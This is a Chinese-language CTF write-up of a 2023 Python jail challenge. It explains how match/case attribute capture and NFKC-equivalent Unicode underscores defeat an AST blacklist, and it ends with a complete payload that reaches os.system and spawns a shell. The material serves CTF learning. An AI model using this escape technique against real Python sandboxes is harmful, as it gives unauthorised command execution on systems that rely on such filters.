---
title: 记一道很抽象的 PyJail
tags:
- ctf
---

CTF 小白，本着重在参与的精神想进队里摸鱼，浪费了一个下午，没想到真的打出了点输出，遂记录之。

题源：2023 强网杯 - Pyjail ! It's myAST !!!!

```python
#!/bin/python3.11
import ast

BAD_ATS = {
  ast.Attribute,
  ast.Subscript,
  ast.comprehension,
  ast.Delete,
  ast.Try,
  ast.For,
  ast.ExceptHandler,
  ast.With,
  ast.Import,
  ast.ImportFrom,
  ast.Assign,
  ast.AnnAssign,
  ast.Constant,
  ast.ClassDef,
  ast.AsyncFunctionDef,
}

BUILTINS = {
    "bool": bool,
    "set": set,
    "tuple": tuple,
    "round": round,
    "map": map,
    "len": len,
    "bytes": bytes,
    "dict": dict,
    "str": str,
    "all": all,
    "range": range,
    "enumerate": enumerate,
    "int": int,
    "zip": zip,
    "filter": filter,
    "list": list,
    "max": max,
    "float": float,
    "divmod": divmod,
    "unicode": str,
    "min": min,
    "range": range,
    "sum": sum,
    "abs": abs,
    "sorted": sorted,
    "repr": repr,
    "object": object,
    "isinstance": isinstance,
}


def is_safe(code):
  if type(code) is str and "__" in code:
    return False

  for x in ast.walk(compile(code, "<QWB7th>", "exec", flags=ast.PyCF_ONLY_AST)):
    if type(x) in BAD_ATS:
      print(x)
      return False

  return True


if __name__ == "__main__":
  user_input = input("Can u input your code to escape > ")

  if is_safe(user_input) and len(user_input) < 1800:
    exec(user_input, {"__builtins__": BUILTINS}, {})
```

# 分析

语法树级别的过滤 & 命名空间限制，目标是 getshell。

由于命名空间限制，获得能 getshell 的函数只能靠继承链，然而语法树又非常重量级地过滤了 Attribute 与 Subscript 操作，想利用继承链必须同时绕过这两个限制。

# 解法

## Trick 1: Match

解此题的突破口在于远端 Python 的版本。自 3.10 起 Python 新增了[模式匹配][match]操作，其对应的树节点是 Match，正好不会被过滤。

利用模式匹配，我们可以捕捉一个实例任何的属性：

```python
def get(d, key):
    match d:
        case dict(get=func):
            return func

get(dict) == dict.get
```

使用这个 trick，就可以将 Attribute 与 Subscript 全部替换成 Match 操作，绕过过滤。

但还有一个问题。

继承链的利用少不了双下划线，然而这题却很鸡贼的也检测了双下划线。因此需要第二个 trick。

# Trick 2: Unicode

Unicode 等价性（Unicode equivalence）是为和许多现存的标准能够兼容，Unicode（统一码）包含了许多特殊字符。在这些字符中，有些在功能上会和其它字符或字符序列等价。因此，Unicode 将一些码位序列定义成相等的。[Wikipedia][unicode-wiki]

当 Python 解释代码时，它会首先使用名为 NFKC 的规范化算法对 Unicode 进行等价，这种算法可以将一些视觉上相似的 Unicode 字符统一为一个标准形式。

```python
import unicodedata
for i in range(0x000000, 0x10FFFF):
    ch2 = chr(i)
    if '_' == unicodedata.normalize('NFKC', ch2):
        print(ch2)
```

上述脚本可以找到所有与下划线 `_` 等价的 Unicode 字符，它们在解释器眼中是同一个字符：`︳︴﹍﹎﹏＿`

```python
match str():
    case (_﹍class﹍_=clazz):
        ...
```

于是可以绕过。

# Payload

一个可用的 Payload

```python
def s(b):
    match bytes([b]):
        case bytes(decode=func):
            return func()
while o := len([min]):
    while t := len([min, min]):
        while th := len([min, min, min]):
            while fo := len([min, min, min, min]):
                while ten := len([min, min, min, min, min, min, min, min, min, min]):
                    match str():
                        case object(_﹍class﹍_=clazz):
                            match clazz:
                                case object(_﹍bases﹍_=bases):
                                    match bases:
                                        case object(_﹍getitem﹍_=gb):
                                            match gb(len([])):
                                                case object(_﹍subclasses﹍_=subclasses):
                                                    match subclasses():
                                                        case object(_﹍getitem﹍_=g2):
                                                            match g2(ten * ten + t*t):
                                                                case object(load_module=lm):
                                                                    match lm(s(ten*(ten+o)+o)+s(ten*(ten+o)+fo+o)):
                                                                        case object(system=sys):
                                                                            sys(s(ten*(ten+o)+fo+o)+s(ten*ten+t*t))

```


[match]: https://docs.python.org/3.10/whatsnew/3.10.html#pep-634-structural-pattern-matching
[unicode-wiki]: https://zh.wikipedia.org/wiki/Unicode%E7%AD%89%E5%83%B9%E6%80%A7